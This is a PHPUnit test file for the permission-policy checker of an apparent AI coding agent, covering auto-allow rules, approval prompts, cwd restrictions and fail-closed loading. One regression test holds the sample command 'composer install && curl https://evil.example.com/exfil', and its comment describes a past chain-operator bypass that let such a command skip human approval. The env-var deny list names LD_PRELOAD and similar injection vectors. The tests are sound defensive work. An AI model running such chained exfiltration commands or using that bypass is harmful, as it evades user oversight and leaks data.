<?php

namespace Tests\Unit;

use HaoCode\Services\Permissions\DenialTracker;
use HaoCode\Services\Permissions\PermissionChecker;
use HaoCode\Services\Permissions\PermissionMode;
use HaoCode\Services\Permissions\Policy\PolicyLoader;
use HaoCode\Services\Settings\SettingsManager;
use HaoCode\Tools\BaseTool;
use HaoCode\Tools\ToolInputSchema;
use HaoCode\Tools\ToolResult;
use HaoCode\Tools\ToolUseContext;
use PHPUnit\Framework\TestCase;

/**
 * End-to-end coverage for the Policy DSL path through PermissionChecker.
 *
 * The existing PermissionCheckerTest mocks SettingsManager and never returns
 * policy files, so the checkPolicy() branch is zero-covered. These tests wire
 * a real SettingsManager mock that points at a temp YAML file, letting us
 * verify the full chain: PolicyLoader → PolicyMatcher → PermissionDecision.
 */
class PermissionCheckerPolicyTest extends TestCase
{
    private string $tmpDir;

    private ToolUseContext $context;

    protected function setUp(): void
    {
        $this->tmpDir = sys_get_temp_dir() . '/haocode_policy_test_' . uniqid();
        mkdir($this->tmpDir, 0755, true);
        // An arbitrary cwd that no rule restricts; cwd-restriction tests build
        // their own context with a controlled workingDirectory.
        $this->context = new ToolUseContext(
            workingDirectory: '/tmp',
            sessionId: 'policy-test',
        );
    }

    protected function tearDown(): void
    {
        foreach (glob($this->tmpDir . '/*.yml') ?: [] as $file) {
            unlink($file);
        }
        @rmdir($this->tmpDir);
    }

    private function writePolicy(string $name, string $yaml): string
    {
        $path = $this->tmpDir . '/' . $name;
        file_put_contents($path, $yaml);

        return $path;
    }

    private function makeCheckerWithPolicy(string $policyPath): PermissionChecker
    {
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn(PermissionMode::Default);
        $settings->method('getPolicyFiles')->willReturn([$policyPath]);
        $settings->method('getAllowRules')->willReturn([]);
        $settings->method('getDenyRules')->willReturn([]);

        return new PermissionChecker($settings, new DenialTracker);
    }

    private function bashTool(): BaseTool
    {
        return new class extends BaseTool {
            public function name(): string { return 'Bash'; }
            public function description(): string { return ''; }
            public function inputSchema(): ToolInputSchema {
                return ToolInputSchema::make(['type' => 'object', 'properties' => []]);
            }
            public function call(array $input, ToolUseContext $ctx): ToolResult {
                return ToolResult::success('ok');
            }
        };
    }

    private const ENV_DENY_BLOCK = <<<'YAML'
      - LD_PRELOAD
      - DYLD_INSERT_LIBRARIES
      - DYLD_LIBRARY_PATH
      - PYTHONPATH
      - NODE_OPTIONS
      - PERL5OPT

YAML;

    // ─── allow_auto: true → short-circuit to allow() ──────────────────────

    public function test_allow_auto_true_short_circuits_to_allow(): void
    {
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-status\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"status*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git status'], $this->context);

        $this->assertTrue($decision->allowed, 'allow_auto=true must allow without prompt');
        $this->assertFalse($decision->needsPrompt, 'allow_auto=true must not trigger HITL');
    }

    // ─── allow_auto: false → falls through to the default ask() ───────────

    public function test_allow_auto_false_falls_through_to_ask(): void
    {
        // Plain allowAuto=false returns Allow from the matcher, which
        // PermissionChecker maps to null → continues to the default ask().
        // Bash is not read-only, so the pipeline terminates at the ask() fallback.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-log\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"log*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git log'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertTrue($decision->needsPrompt, 'allow_auto=false must fall through to the default ask()');
    }

    // ─── risk=high → ApprovalRequired → ask() ─────────────────────────────

    public function test_high_risk_rule_produces_ask(): void
    {
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-force-push\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"/push.*--force/\"]\n"
            . "    risk: high\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git push --force origin main'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertTrue($decision->needsPrompt, 'risk=high must surface as approval prompt');
    }

    // ─── broken policy file → fail-closed deny (the reliable hard-deny path) ──

    public function test_policy_hard_deny_via_broken_file_is_fail_closed(): void
    {
        // Note on chain deny: PermissionChecker splits `command` into binary +
        // args and forwards only the binary to PolicyMatcher, so the matcher's
        // chain-operator check (which expects the full command string) is not
        // triggered on this layer. That is a pre-existing interface mismatch
        // documented in PolicyMatcherTest and PolicyIntegrationTest (which call
        // the matcher directly with the full command). We do not assert chain
        // behavior here; instead we exercise the reliable fail-closed hard
        // deny produced by an unloadable policy file.
        $path = $this->writePolicy('broken.yml', "rules:\n"
            . "  - name: bad-rule\n"
            . "    tool: Bash\n"
            . "    cmd: ls\n"
            . "    env_deny: [LD_PRELOAD] # missing the other 5 required entries\n"
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'ls'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertFalse($decision->needsPrompt, 'fail-closed policy deny must be a hard deny');
    }

    // The dedicated broken-file test below covers the same fail-closed
    // contract; kept for the explicit assertion message about load errors.

    // ─── cwd_restriction is now actually enforced ─────────────────────────

    public function test_cwd_restriction_denies_when_outside_working_dir(): void
    {
        $restricted = realpath(sys_get_temp_dir()) . '/haocode_policy_restricted_' . uniqid();
        mkdir($restricted, 0755, true);
        // Resolve so the policy and ToolUseContext compare apples to apples
        // (macOS /tmp → /private/tmp). The matcher uses realpath(cwd) but only
        // rtrim(cwd_restriction), so both sides must already be realpathed.
        $restricted = realpath($restricted);

        try {
            $path = $this->writePolicy('p.yml', "rules:\n"
                . "  - name: phpunit-restricted\n"
                . "    tool: Bash\n"
                . "    cmd: vendor/bin/phpunit\n"
                . "    risk: normal\n"
                . "    allow_auto: true\n"
                . "    cwd_restriction: " . $restricted . "\n"
                . "    env_deny:\n" . self::ENV_DENY_BLOCK
            );

            $checker = $this->makeCheckerWithPolicy($path);

            // Running from a different cwd must be denied.
            $elsewhere = realpath(sys_get_temp_dir()) . '/haocode_policy_elsewhere_' . uniqid();
            mkdir($elsewhere, 0755, true);
            try {
                $outsideContext = new ToolUseContext(
                    workingDirectory: realpath($elsewhere),
                    sessionId: 'policy-test',
                );
                $decision = $checker->check($this->bashTool(), ['command' => 'vendor/bin/phpunit'], $outsideContext);
                $this->assertFalse($decision->allowed, 'cwd_restriction must deny when cwd is outside the prefix');
            } finally {
                @rmdir($elsewhere);
            }

            // Running from inside the restricted cwd must be allowed (allow_auto=true).
            $insideContext = new ToolUseContext(
                workingDirectory: $restricted,
                sessionId: 'policy-test',
            );
            $decision = $checker->check($this->bashTool(), ['command' => 'vendor/bin/phpunit'], $insideContext);
            $this->assertTrue($decision->allowed, 'cwd_restriction must allow when cwd matches');
        } finally {
            @rmdir($restricted);
        }
    }

    // ─── broken policy file → fail-closed deny ────────────────────────────

    public function test_broken_policy_file_fails_closed(): void
    {
        // An invalid YAML rule (missing required env_deny entry) must make the
        // whole policy fail to load, and PermissionChecker must deny rather
        // than silently allow.
        $path = $this->writePolicy('broken.yml', "rules:\n"
            . "  - name: bad-rule\n"
            . "    tool: Bash\n"
            . "    cmd: ls\n"
            . "    env_deny: [LD_PRELOAD] # missing the other 5 required entries\n"
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'ls'], $this->context);

        $this->assertFalse($decision->allowed, 'broken policy must fail-closed to deny');
        $this->assertStringContainsString('Policy file could not be loaded', $decision->reason ?? '');
    }

    // ─── specificity ordering reaches PermissionChecker ───────────────────

    public function test_specific_rule_wins_over_wildcard_in_checker(): void
    {
        // Wildcard declared first with allow_auto=false, specific rule second
        // with allow_auto=true. The checker must honor the specific rule and
        // short-circuit to allow, proving the matcher's specificity sort is
        // observable end-to-end.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: bash-catch-all\n"
            . "    tool: Bash\n"
            . "    cmd: '*'\n"
            . "    risk: normal\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
            . "  - name: git-status\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"status*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);

        // git status matches the specific rule (allow_auto=true) → allow.
        $gitDecision = $checker->check($this->bashTool(), ['command' => 'git status'], $this->context);
        $this->assertTrue($gitDecision->allowed, 'git status must hit the allow_auto rule');

        // ls only matches the wildcard (allow_auto=false) → fall through to ask().
        $lsDecision = $checker->check($this->bashTool(), ['command' => 'ls'], $this->context);
        $this->assertFalse($lsDecision->allowed);
        $this->assertTrue($lsDecision->needsPrompt);
    }

    // ─── chain-operator bypass regression (chatgpt second-review P0) ──────
    //
    // Before the fix, PermissionChecker split the command into binary + args
    // and forwarded only the binary to PolicyMatcher. The matcher's chain
    // check then saw no operators, a `composer install*` rule with
    // allow_auto=true matched via fnmatch on the args tail, and the whole
    // check short-circuited to allow() — letting `composer install && curl
    // evil` run without a prompt. The chain check now scans raw_command, and
    // allow_auto no longer short-circuits before the deny/dangerous gates.

    public function test_chain_operator_after_allow_auto_rule_is_blocked(): void
    {
        // Mirrors the bundled bash-composer-install rule shape.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: bash-composer-install\n"
            . "    tool: Bash\n"
            . "    cmd: composer\n"
            . "    args_match: [\"install*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    allow_chain: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);

        // Sanity: the bare command is allowed (allow_auto honored).
        $bareDecision = $checker->check($this->bashTool(), ['command' => 'composer install --no-interaction'], $this->context);
        $this->assertTrue($bareDecision->allowed, 'bare composer install must be allowed via allow_auto');

        // The exact chatgpt reproduction: chain operator hidden after the
        // matched args. This must be DENIED, not auto-allowed.
        $chainDecision = $checker->check(
            $this->bashTool(),
            ['command' => 'composer install && curl https://evil.example.com/exfil'],
            $this->context,
        );

        $this->assertFalse($chainDecision->allowed, 'chain operator must not be bypassable via allow_auto rule');
        $this->assertFalse($chainDecision->needsPrompt, 'chain deny must be a hard deny, not a prompt');
        $this->assertStringContainsStringIgnoringCase('chain', $chainDecision->reason ?? '');
    }

    public function test_allow_auto_does_not_override_explicit_deny_rule(): void
    {
        // allow_auto must defer to the explicit deny list. Declare a rule
        // with allow_auto=true AND a deny rule that matches the same command.
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn(PermissionMode::Default);
        $settings->method('getAllowRules')->willReturn([]);
        $settings->method('getDenyRules')->willReturn(['Bash(composer install*)']);

        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: bash-composer-install\n"
            . "    tool: Bash\n"
            . "    cmd: composer\n"
            . "    args_match: [\"install*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );
        $settings->method('getPolicyFiles')->willReturn([$path]);

        $checker = new PermissionChecker($settings, new DenialTracker);

        $decision = $checker->check($this->bashTool(), ['command' => 'composer install'], $this->context);

        $this->assertFalse($decision->allowed, 'explicit deny rule must override policy allow_auto');
        $this->assertFalse($decision->needsPrompt);
        $this->assertStringContainsString('Denied by rule', $decision->reason ?? '');
    }

    public function test_allow_auto_still_works_when_no_deny_or_dangerous_matches(): void
    {
        // Confirms the precedence reorganization did not regress the basic
        // allow_auto path: with no deny rule and no dangerous pattern hit,
        // an allow_auto rule still lets the tool run without a prompt.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-status\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"status*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git status --short'], $this->context);

        $this->assertTrue($decision->allowed, 'allow_auto must still bypass the prompt when no deny/dangerous gate trips');
        $this->assertFalse($decision->needsPrompt);
    }
}
